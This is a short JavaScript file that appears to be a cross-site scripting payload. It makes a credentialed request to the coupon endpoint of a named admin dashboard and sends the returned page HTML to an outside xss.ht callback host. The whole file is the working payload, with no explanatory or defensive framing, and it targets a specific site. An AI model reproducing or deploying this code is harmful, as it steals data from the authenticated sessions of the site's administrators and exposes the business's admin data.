var xhr = new XMLHttpRequest();

xhr.open('GET', 'https://haatadmindashboard.azurewebsites.net/admin/get_coupons?couponType=3&_=1647369395138', true);

xhr.withCredentials = true;
xhr.onreadystatechange = function() {
	if (xhr.readyState == 4) {
		var http = new XMLHttpRequest();
		var url = "https://mostashio2017.xss.ht/page_callback";
		http.open("POST", url, true);
		http.setRequestHeader("Content-type", "text/plain");
		http.onreadystatechange = function() {
			if (http.readyState == 4 && http.status == 200) {

			}
		};
		page_data = {
			"page_html": xhr.responseText,
			"uri": 'https://haatadmindashboard.azurewebsites.net/admin/get_coupons'
		};
		http.send(JSON.stringify(page_data));
	}
};
xhr.send(null);